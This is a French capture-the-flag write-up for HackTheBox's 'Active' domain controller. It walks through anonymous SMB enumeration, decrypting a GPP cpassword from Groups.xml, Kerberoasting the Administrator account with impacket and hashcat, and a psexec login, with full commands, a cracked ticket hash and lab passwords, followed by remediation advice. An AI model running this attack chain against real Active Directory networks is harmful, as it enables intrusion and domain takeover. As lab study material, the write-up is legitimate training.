# Active — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows Server (contrôleur de domaine) |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-10-04 |
| **Vecteur** | SMB anonyme → **GPP cpassword** (`Groups.xml` dans SYSVOL) → `SVC_TGS` → **Kerberoasting** de l'`Administrator` (qui porte un SPN) → mot de passe DA → psexec |
| **CVE** | aucune — abus de configuration AD |
| **Tags** | active-directory · gpp-cpassword · kerberoasting |

> `<IP_CIBLE>` = IP de session. Mets le domaine dans `/etc/hosts` dès que tu le connais.

> 🎯 **Nouveautés à apprendre ici** :
> 1) **GPP cpassword** — un mot de passe stocké dans un `Groups.xml` de SYSVOL, chiffré avec une **clé AES publiée par Microsoft** → déchiffrable.
> 2) **Kerberoasting** — ta 1re fois : demander le ticket de service d'un compte à SPN et le casser hors ligne.

---

## TL;DR

Le partage **`Replication`** est lisible en **anonyme** → il contient un **`Groups.xml`** (Group Policy
Preferences) avec un attribut **`cpassword`** chiffré par une **clé AES publiée par Microsoft** → `gpp-decrypt`
le casse instantanément : `SVC_TGS` / `GPPstillStandingStrong2k18`. Ce compte de domaine valide suffit pour
**Kerberoaster** : je demande les TGS des comptes à SPN et, scandale de la box, c'est l'**`Administrator`**
qui porte un SPN (`active/CIFS`). Son TGS est chiffré avec le hash de **son** mot de passe → cassé hors ligne
(`hashcat -m 13100`) → `Ticketmaster1968`. Connexion en **psexec** comme Administrator → DC compromis.

**SMB anonyme → GPP cpassword (`SVC_TGS`) → Kerberoast de l'Administrator (SPN) → mot de passe DA → psexec.**

---

## 1. Reconnaissance

```bash
┌──(kali㉿kali)-[~/nmap/active]
└─$ nmap -sC -sV -p- 10.129.114.74 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 18:01 +0200
Nmap scan report for 10.129.114.74
Host is up (0.023s latency).
Not shown: 65513 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-04 16:02:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-04T16:03:00
|_  start_date: 2026-10-04T15:59:26

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.16 seconds

```

| Port | Service | Signale |
| --- | --- | --- |
| 53 | DNS | contrôleur de domaine |
| 88 | Kerberos | authentification AD |
| 135/139/445 | RPC/SMB | énumération, partages |
| 389/3268 | LDAP/GC | annuaire |
| 464 | kpasswd | changement de mot de passe Kerberos |

- Domaine / hostname : **`active.htb`** / **`DC`** (Windows Server 2008 R2).

---

## 2. Foothold — GPP cpassword dans SYSVOL

**Méthode :** partage SMB accessible en anonyme → chercher un `Groups.xml` (Group Policy Preferences) →
il contient un `cpassword` chiffré → le déchiffrer.

```bash
# Lister les partages en anonyme, repérer un partage lisible (type Replication / SYSVOL)
┌──(kali㉿kali)-[~/nmap/active]
└─$ nxc smb 10.129.114.74 -u '' -p '' --shares 
SMB         10.129.114.74   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.114.74   445    DC               [+] active.htb\: 
SMB         10.129.114.74   445    DC               [*] Enumerated shares
SMB         10.129.114.74   445    DC               Share           Permissions     Remark
SMB         10.129.114.74   445    DC               -----           -----------     ------
SMB         10.129.114.74   445    DC               ADMIN$                          Remote Admin
SMB         10.129.114.74   445    DC               C$                              Default share
SMB         10.129.114.74   445    DC               IPC$                            Remote IPC
SMB         10.129.114.74   445    DC               NETLOGON                        Logon server share 
SMB         10.129.114.74   445    DC               Replication     READ            
SMB         10.129.114.74   445    DC               SYSVOL                          Logon server share 
SMB         10.129.114.74   445    DC               Users  

┌──(kali㉿kali)-[~/nmap/active]
└─$ smbclient //10.129.114.74/Replication -N -c 'recurse ON; prompt OFF; mget *'
Anonymous login successful
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (1,3 KiloBytes/sec) (average 0,6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (30,6 KiloBytes/sec) (average 8,1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (5,8 KiloBytes/sec) (average 7,7 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (11,9 KiloBytes/sec) (average 8,4 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (36,3 KiloBytes/sec) (average 12,8 KiloBytes/sec)

┌──(kali㉿kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─$ cat Groups.xml                                                      
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

# Déchiffrer le cpassword trouvé
gpp-decrypt "<cpassword>"
```

- Partage lisible : `Replication`
- Compte + mot de passe GPP : `GPPstillStandingStrong2k18`

> **Pourquoi c'est cassable** : Microsoft a publié la **clé AES** utilisée pour chiffrer les cpassword des GPP (patch MS14-025). Donc tout `cpassword` = mot de passe en clair. Ne jamais stocker de mot de passe en GPP.

**Flag user :** desktop du compte obtenu (non publié).

---

## 3. Privesc — Kerberoasting

**Méthode :** avec un compte de domaine valide, demander les **tickets de service (TGS)** des comptes
qui ont un **SPN**. Le ticket est chiffré avec le hash du mot de passe du compte de service → **cassable
hors ligne**. Ici, un compte à privilèges (Administrator) a un SPN.

```bash
┌──(kali㉿kali)-[~/nmap/active]
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.114.74 -request -outputfile spn.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2026-10-04 18:00:26.932143             



[-] CCache file is not found. Skipping...

hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$413555a8576fb9a97866613254d7b672$0ea5aa2c938e0403a75c523b86df16b7b55ae1a52dd663de9a69a13e203cd2ace9ed22028a1a90bfa4e19c67d7d147ae41ab3e7dc94756d97c15916103ffeb65dce79033ff85fca90d3999b3e2719989dd1603c518618af12e9c37980760238de009cccf60a661c7e1d1d89712f89acb19ec29ce6ad93197f7d4a451925688b7cff5b109e336a8f6983699d770b22764b9fd4997320c4d5d3e61314cfdcce5ba01b72f683ad2099b9f6ad4dc3c1a41416704bd6f395cd3314e55b403e3ec705d0e970f11caa6a23fa242d08bfaf090ec8debd017ea9673ecee2c2a16c712195d99c9fb13782acddc650fde3917e42d916740ef4e4e1b11aa28bbc52c3942b82113cc05930217cf4de10a985c21dfda998a6745ac052950957f6749e417197bfedb7b70dc368660ce98b2cd5004dcfc067b28793b26ea841e279c97affcbfef8003e81a1e3646f28fa35cccdc247e4c08de4a3f8aab423ea62b58444a071e5e66cd4cf22dd62b10229c68a2745c6dcb0c0167cbdde6ce762fad9746625df3438cd5461fe5cb308460c71dd592abc9b95bc954132b5f37b80e20f5656e9310a853f4e9e9be200d42dcb58f8f537a27e3466eec9915b4bcc53c60f6d35f7df62ead8ec0d5714bf0ce42c09a1375833a6a4dfa3a18dca15717e560c3844608cd5bb16e074e8caaef7050502b6c81ff19411b8ed1fd2f85c589b93feb39d9c31272441947826192ab9652e47b17f3ce0ced7009cdca6001548102f8815e21770d5e227bad20ae13e0e9519cf7d441d5ef2593f7a90989a7e39a11a091743cbfb5ab171a91a4a6609a7dfb3f990f8c474f0ef0279010bae0ddf7bcde95d1e1843fba0e0ef49598bf4cbc4a3c69ca6a216160e5a1f9e4607815d556d8589259d1b75690b476da99a275470972a878f2df8907920e279b319803a2ca67f0fa8af1a5616a1f69be0e0087f09aeaaf6acf4576d3750e19604273db77fc7d37cfd1b2602a545b5be4231ae37161fde1ad2a85b13599f411a7666f8869f7f8da9880a591fe3be16422e768071eb2e641f15d82f02819bc4e857d6e1c6b95d47bd57dfa701d12ec3abb5e10847572879f4319ef922efffadd6dcd9a0b0139322af984dd2553a67067f4a096cd9e4a05eff25f9d6519b38f6209b86862941783240f23aa5f342ed2f8c5ec54c79e2d9a59435eb111c5fd02eb3f0dba2897b45be85d2945711476528e9b89daa223c3a4c4e7c57204255cbc51f0c3da86b3f99e15:Ticketmaster1968

```

- Compte à SPN ciblé : `Administrator`
- Mot de passe cassé : `Ticketmaster1968`
- Accès :
```bash
impacket-psexec <DOMAINE>/Administrator:'<pass>'@<IP_CIBLE>
```

- Pourquoi ça marche (pour l'oral) : **n'importe quel compte de domaine valide** (ici `SVC_TGS`) peut demander au KDC le TGS de **n'importe quel SPN** — c'est le fonctionnement normal de Kerberos. Le TGS est chiffré avec le **hash du mot de passe du compte qui porte le SPN** ; je le casse **hors ligne** (aucun log d'échec, pas de verrouillage). Le fait que `SVC_TGS` soit lui-même un compte de service est **sans rapport** : ce qui compte, c'est que j'aie des creds valides, et que ce soit l'**Administrator** qui porte un SPN — une erreur de conf (un compte à privilèges ne devrait jamais avoir de SPN).

**Flag root :** desktop Administrator (non publié).

> **AS-REP (18200) vs Kerberoast (13100)** : AS-REP = compte **sans pré-auth** (parfois sans creds) ; Kerberoast = compte **avec SPN**, exige un compte valide. Les deux → hash cassable hors ligne.

---

## 4. Remédiation

- **GPP** : ne jamais y stocker de mot de passe ; appliquer MS14-025 ; purger les vieux `Groups.xml` de SYSVOL.
- **Kerberoasting** : mots de passe de service **longs et aléatoires** (25+), ou **gMSA** ; éviter de mettre un SPN sur un compte à privilèges.
- Désactiver l'accès anonyme aux partages.

---

## 5. Leçons

- <GPP cpassword : pourquoi un secret « chiffré » peut être en clair (clé publique)>
- <Kerberoasting : 1re fois — le mécanisme SPN → TGS → cassage>
- <AS-REP vs Kerberoast : bien les distinguer à l'oral>

---

## Références

- Fiches liées : [smb](../outils/smb.md) · [ad-attacks](../outils/ad-attacks.md) · [impacket](../outils/impacket.md) · [hashcat](../outils/hashcat.md)
